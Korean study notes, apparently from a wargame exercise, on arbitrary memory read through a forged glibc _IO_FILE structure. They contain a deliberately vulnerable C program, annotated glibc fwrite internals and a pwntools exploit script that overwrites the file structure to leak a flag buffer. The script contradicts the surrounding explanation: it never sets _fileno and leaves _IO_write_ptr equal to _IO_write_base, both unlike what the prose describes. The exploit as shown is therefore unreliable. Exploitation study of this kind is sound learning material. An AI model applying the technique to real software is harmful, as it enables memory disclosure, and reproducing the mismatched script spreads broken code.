# _IO_FILE Arbitrary Address Read
파일을 읽고 쓰는 과정은 라이브러리 함수 내부에서 파일 구조체의 포인터와 값들을 이용함
파일을 쓰는 과정에서 파일 구조체를 조작해 임의 메모리 값을 읽는 실습

'''
// Name: iofile_aar
// gcc -o iofile_aar iofile_aar.c -no-pie

#include <stdio.h>
#include <unistd.h>
#include <string.h>

char flag_buf[1024];
FILE *fp;

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int read_flag() {
    FILE *fp;
    fp = fopen("/home/iofile_aar/flag", "r");
    fread(flag_buf, sizeof(char), sizeof(flag_buf), fp);
    fclose(fp);
}

int main() {
  const char *data = "TEST FILE!";

  init();
  read_flag();

  fp = fopen("/tmp/testfile", "w");

  printf("Data: ");

  read(0, fp, 300);

  fwrite(data, sizeof(char), sizeof(flag_buf), fp);
  fclose(fp);
}
'''


## 파일 쓰기 함수 분석
### 파일 쓰기 과정
파일에 데이터를 쓰기 위한 함수는 대표적으로 fwrite, fputs 가 있음
해당 함수는 라이브러리 내부에서 _IO_sputn함수를 호출함 아래 코드를 살펴보면 해당 함수는 _IO_XSPUTN함수의 매코르이며 실질적으로 _IO_new_file_xsputn함수를 실행함 이 함수에서는 파일 함수로 전달된 인자인 데이터와 길이를 검사하고 _IO_OVERFLOW, 즉 _IO_new_file_overflow 함수를 호출함
'''
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)

_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  ...
  if (to_do + must_flush > 0)
    {
      _IO_size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
'''
실제로 파일에 내용을 쓰는 과정은 _IO_new_file_overflow를 시작으로 다양한 함수가 홏출되면서 이뤄짐
그렇다면 _IO_new_file_overflow함수 내부에서 어떻게 파일에 데이터를 쓰는지 자세하게 알아보면

### _IO_new_file_overflow
'''
int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_IO_write_base == NULL)
    {
      _IO_doallocbuf (f);
      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
    }
      /* Otherwise must be currently reading.
     If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
     logically slide the buffer forwards one block (by setting the
     read pointers to all point at the beginning of the block).  This
     makes room for subsequent output.
     Otherwise, set the read pointers to _IO_read_end (leaving that
     alone, so it can continue to correspond to the external position). */
      if (__glibc_unlikely (_IO_in_backup (f)))
    {
      size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
      _IO_free_backup_area (f);
      f->_IO_read_base -= MIN (nbackup,
                   f->_IO_read_base - f->_IO_buf_base);
      f->_IO_read_ptr = f->_IO_read_base;
    }
      if (f->_IO_read_ptr == f->_IO_buf_end)
    f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
      f->_IO_write_ptr = f->_IO_read_ptr;
      f->_IO_write_base = f->_IO_write_ptr;
      f->_IO_write_end = f->_IO_buf_end;
      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;
      f->_flags |= _IO_CURRENTLY_PUTTING;
      if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
    f->_IO_write_end = f->_IO_write_ptr;
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
             f->_IO_write_ptr - f->_IO_write_base);
  ...
}
int
_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  return (to_do == 0
	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)
'''
4-9번 라인에서 파일 포인터의 _flags변수에 쓰기 권한이 있는지를 확인함

11번 라인에서 _flags에 _IO_CURRENTLY_PUTTING가 설정되어 있지 않으면 12-43번 라인에 걸쳐 파일 구조체의 _IO_write_ptr, _IO_write_base, IO_write_end 필드등을 다른 값으로 변조함

44-46번 라인을 살펴보면 해당 함수의 인자로 전달된 ch가 EOF즉 -1이라면 _IO_do_write함수를 호출함

앞서 _IO_new_file_overflow를 호출할떄의 인자를 확인해보면 EOF를 전달하므로 _IO_do_write함수가 호출되는데 전달되는 인자가 파일 구조체의 멤버 변수임을 알 수 있음

_IO_do_write함수는 내부적으로 new_do_write함수를 호출하므로 해당 함수에서 파일 구조체 내 포인터로 어떻게 파일을 쓰는지 분석

#### new_do_write
'''
#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      _IO_off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
		       ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}
'''
##### 플래그 검사
파일을 쓰기에 앞서 파일 포인터의 _flags변수에 _IO_IS_APPENDING플래그가 포함되어 있는지 확인함
포함되어 있지 않는 경우 _IO_read_end와 _IO_write_base가 다르면 lseek시스템 콜을 호출함

#### _IO_sysWRITE호출
new_do_write함수의 인자인 파일 포인터와 data, 그리고 to_do를 인자로 _IOSYSWRITE함수를 호출하는데 이는 곧 vtable의 _IO_new_file_write 함수임
'''
#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
'''


### _IO_new_file_write
_IO_new_file_write 함수 내부에서는 write시스템 콜을 사용해 파일에 데이터를 작성함 시스템 콜의 인자로 파일 구조체에서 파일 디스크립터를 나타내는 _fileno, _IO_write_base인 data 그리고 _IO_write_ptr - _IO_write_base로 연산된 to_do 변수가 전달됨


from pwn import *
context.arch = 'x86-64'
p = process('./iofile_aar')
e = ELF('./iofile_aar')
flag_buf = e.symbols['flag_buf']
fs = FileStructure()

fs.flags = 0xfbad0000 | 0x800
fs._IO_read_ptr = flag_buf
fs._IO_read_base = 0
fs._IO_read_end = 0
fs._IO_write_base = flag_buf
fs._IO_write_ptr = flag_buf
payload = bytes(fs)
p.sendlineafter(b'Data: ', payload)
p.interactive()


코드를 사펴보면 _flags변수에 _IO_MAGIC과 _IO_CURRNTLY_PUTTING 비트를 포함하나 값을 입력함
_IO_CURRNTLY_PUTTNG를 포함하는 이유는 _IO_CURRENTLLY_PUTTing가 포함되엉 ㅣㅆ지 않으면 _IO_new_file_overflow()내부에서 파일 구조체 필드 중 익스플로잇에 사용되는 _IO_write_base와 _IO_write_ptr필드를 다른 값으로 바꿔버리기 때문임

이후 /home/iofile_aar/flag의 내용이 저장된 flag_buf의 데이터를 1024바이트 만큼 출력하기 위해 _IO_write_base와 _IO_write_ptr을 각각 flag_buf 주소와 flag_buf + 1024 의 주소를 입력함

데이터를 출력하기 위한 과정을 모두 마쳤다면 프로그램에서 표준 출력을 사ㅏ용해 해당 내용을 출력하도록 _fileno를 1로 변경
익스에서 풀력하는데에 필요하지 않은 _IO_read_end포인터를 flag_buf의 주소로 조작하ㅏ는 것을 확인할 수 있음
이는 new_dowrite함수 내에서 lseek시스템 콜이 호춛되지 않도록 하기 위함임

lseek시스템 콜이 호출되지 않도록 하는 또 다른 방법으로는 플래그에 _IO_IS_APPENDING(0x1000)를 설정하는 방법이 있음
new_do_write()내에서 _IO_IS_APPENDING가 플래그에 포함된 경우 lseek  시스템 콜을 호출하는 구문으로 이동하지 않기 때문임